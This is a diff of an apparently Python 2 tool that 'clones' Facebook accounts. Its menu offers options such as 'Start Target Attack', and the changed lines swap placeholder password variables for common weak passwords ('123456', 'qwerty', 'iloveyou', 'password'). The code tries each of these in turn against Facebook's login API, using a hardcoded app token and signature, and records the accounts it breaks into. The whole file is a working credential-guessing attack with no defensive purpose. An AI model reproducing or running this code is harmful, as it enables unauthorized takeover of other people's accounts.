@@ -80,7 +80,7 @@ logo = """
              ｜/_/ " ヮ"ﾉ_/
              /Y　ﾚ `ーイ /
              ﾚ|　ヽ-====-＼
-             ﾚヽ　/／⌒＼⌒＼
+             ﾚヽ　/／⌒＼ ⌒＼
              　 ＼ｿ 　　｜  ｜
 　             　 )ヽ＿／＿／
 　              ／　　 ﾉ ﾉ
@@ -245,7 +245,7 @@ def menu():
         print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;96mStart Cloning Indonasia"
         print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m4.\x1b[1;95mStart Cloning USA"
         print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m5.\x1b[1;94mStart Cloning Bangladash"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m6.\x1b[1;93mStart Cloning Testing"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m6.\x1b[1;93mStart Cloning All Country"
         print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m7.\x1b[1;92mStart Target  Attack"
         print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m8.\x1b[1;91mBlack Mafia   Massage "
         print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m9.\033[1;93mAfter Cloning Data Reset"
@@ -1634,7 +1634,7 @@ def pilih_test():
 		try:													
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
-			pass1 = ['mobile_phone']											
+			pass1 = 'zxcvbnm'											
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			q = json.load(data)												
 			if 'access_token' in q:
@@ -1656,7 +1656,7 @@ def pilih_test():
 				    cek.close()
 				    cekpoint.append(user+pass1)
                                 else:
-				    pass2 = ['name']										
+				    pass2 = 'a1b2c3'										
                                     data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			            q = json.load(data)												
 			            if 'access_token' in q:	
@@ -1678,7 +1678,7 @@ def pilih_test():
 				               cek.close()
 				               cekpoint.append(user+pass2)								
 				           else:											
-					       pass3 = ['email']								
+					       pass3 = 'iloveyou'								
 					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
 					       q = json.load(data)										
 					       if 'access_token' in q:	
@@ -1700,7 +1700,7 @@ def pilih_test():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = ['dump_phone']											
+						           pass4 = '112233'											
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
@@ -1722,7 +1722,7 @@ def pilih_test():
 				                                       cek.close()
 				                                       cekpoint.append(user+pass4)					
 					                           else:									
-						                       pass5 = ['dump_mail']					
+						                       pass5 = '123456'				
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                       q = json.load(data)								
 						                       if 'access_token' in q:	
@@ -1744,7 +1744,7 @@ def pilih_test():
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = ['birthday'].replace('/','-')										
+							                           pass6 = '0987654321'								
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:	
@@ -1766,7 +1766,7 @@ def pilih_test():
 				                                                               cek.close()
 				                                                               cekpoint.append(user+pass6)	
 						                                           else:							
-								                               pass7 = (['counting']+'00000000000')					
+								                               pass7 = 'qwerty'					
 								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
 								                               q = json.load(data)						
 								                               if 'access_token' in q:		
@@ -1788,7 +1788,7 @@ def pilih_test():
 				                                                                           cek.close()
 				                                                                           cekpoint.append(user+pass7)           					
 								                                       else:						
-										                           pass8 = ['data']										
+										                           pass8 = 'password'										
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
 			                                                                                   if 'access_token' in q:		
@@ -1810,7 +1810,7 @@ def pilih_test():
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass8)   	
 										                                   else:					
-										                                       pass9 = ['786786','Pakistan','iloveyou','khan123','Pakistan786','112233','123456789','0987654321','456456','000000','Pakarmy','Muhammad786','qwerty','qwertyuiop','asdfghjkl','zxcvbnm','11223344','789789','Afridi']				
+										                                       pass9 = 'abc123'				
 										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
 										                                       q = json.load(data)				
 										                                       if 'access_token' in q:		
